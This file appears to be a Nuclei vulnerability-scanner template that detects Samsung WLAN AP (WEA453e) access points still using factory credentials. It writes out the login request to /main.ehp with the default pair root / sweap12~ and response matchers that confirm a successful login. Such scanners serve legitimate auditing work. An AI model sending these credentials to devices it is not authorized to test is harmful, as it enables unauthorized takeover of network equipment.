id: samsung-wlan-default-login

info:
  name: Samsung Wlan AP (WEA453e) 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: 该模板通过尝试 Samsung Wlan AP (WEA453e) 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://securityforeveryone.com/tools/samsung-wlan-ap-wea453e-default-credentials-scanner
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: samsung,default-login,vuln

http:
  - raw:
      - |
        POST /main.ehp HTTP/1.1
        Host: {{Hostname}}

        httpd;General;lang=en&login_id={{username}}&login_pw={{password}}

    payloads:
      username:
        - root
      password:
        - sweap12~
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "document.formParent2.changepasswd1.value"
          - "passwd_change.ehp"

      - type: status
        status:
          - 200
